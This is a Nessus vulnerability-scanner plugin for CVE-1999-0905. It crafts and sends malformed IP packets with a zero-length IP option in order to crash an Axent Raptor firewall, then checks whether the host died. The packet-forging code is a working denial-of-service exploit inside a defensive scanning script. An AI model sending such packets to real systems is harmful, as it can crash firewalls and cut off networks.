#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# THIS SCRIPT WAS NOT TESTED !
#

if(description)
{
 script_id(10022);
 script_bugtraq_id(736);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-1999-0905");
 name["english"] = "Axent Raptor's DoS";
 name["francais"] = "Déni de service contre Raptor de Axent";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to make
the remote Axent raptor freeze by sending
it a IP packet containing special options
(of length equals to 0)

An attacker may use this flaw to make your
firewall crash continuously, preventing
your network from working properly.

Solution : filter the incoming IP traffic
containing IP options, and contact Axent
for a patch
Risk factor : High";

 desc["francais"] = "Il a été possible de tuer
l'Axent Raptor distant en lui envoyant
un paquet IP contenant des options spéciales
(de longueur nulle)

Un pirate peut utiliser ce problème pour continuellement
faire rebooter votre firewall, empechant ainsi votre 
réseau de fonctionner correctement.

Solution : filtrez le traffic IP entrant contenant
des options IP, et contactez Axent pour un patch.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes an axent raptor";
 summary["francais"] = "Fait planter un axent raptor";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 
 exit(0);
}

#
# The script code starts here
#

start_denial();

ip = forge_ip_packet(ip_hl: 5,	 	ip_v : 4,	ip_tos : 123,
		     ip_len : 80, 	ip_id:1234,	ip_off : 0,
		     ip_ttl : 0xff,	ip_p:IPPROTO_TCP,
		     ip_src : this_host());
		     
ipo = insert_ip_options(ip:ip, code:44, length:0, value:raw_string(0x00, 0x01));

tcp = forge_tcp_packet(ip:ipo, th_sport:80, th_dport:80, th_seq:rand(),
		       th_ack:rand(), th_off:5, th_flags:TH_ACK,th_win:8192,
			 th_x2:0, th_urp:0);

send_packet(tcp, pcap_active:FALSE) x 10;
sleep(5);
alive = end_denial();					     
if(!alive){
  		security_hole(0);
		set_kb_item(name:"Host/dead", value:TRUE);
		}
